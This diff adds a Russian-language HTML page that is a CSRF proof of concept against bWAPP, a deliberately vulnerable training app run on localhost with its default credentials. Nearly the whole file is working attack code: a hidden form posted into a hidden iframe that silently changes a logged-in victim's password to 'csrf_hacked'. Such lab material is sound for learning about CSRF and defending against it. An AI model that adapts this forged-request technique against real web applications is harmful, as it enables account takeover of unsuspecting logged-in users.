@@ -1,0 +1,50 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+  <meta charset="UTF-8" />
+  <title>CSRF — смена пароля bWAPP (базовый пример)</title>
+  <style>
+    body { font-family: sans-serif; max-width: 520px; margin: 40px auto; line-height: 1.5; }
+    code { background: #eee; padding: 2px 6px; }
+    button { margin-top: 12px; padding: 8px 16px; }
+  </style>
+</head>
+<body>
+  <h1>CSRF: смена пароля</h1>
+  <p>
+    Жертва должна быть залогинена в bWAPP (<code>bee</code> / <code>bug</code>, security low).
+    По кнопке ниже уходит скрытый <strong>POST</strong> на
+    <code id="target"></code> с cookie сессии.
+  </p>
+  <p>Новый пароль: <strong id="newpw"></strong></p>
+  <button type="button" id="run">Отправить запрос смены пароля</button>
+  <p id="status"></p>
+
+  <iframe name="csrf-frame" style="display:none" title="csrf"></iframe>
+  <form id="csrf" target="csrf-frame" method="POST" style="display:none">
+    <input type="hidden" name="password_curr" id="curr" />
+    <input type="hidden" name="password_new" id="new" />
+    <input type="hidden" name="password_conf" id="conf" />
+    <input type="hidden" name="action" value="change" />
+  </form>
+
+  <script>
+    var BWAPP = "http://localhost";
+    var CURRENT = "bug";
+    var NEW_PASS = "csrf_hacked";
+
+    document.getElementById("target").textContent = BWAPP + "/password_change.php";
+    document.getElementById("newpw").textContent = NEW_PASS;
+    document.getElementById("csrf").action = BWAPP + "/password_change.php";
+    document.getElementById("curr").value = CURRENT;
+    document.getElementById("new").value = NEW_PASS;
+    document.getElementById("conf").value = NEW_PASS;
+
+    document.getElementById("run").onclick = function () {
+      document.getElementById("csrf").submit();
+      document.getElementById("status").textContent =
+        "Запрос отправлен. Проверьте вход в bWAPP с паролем: " + NEW_PASS;
+    };
+  </script>
+</body>
+</html>
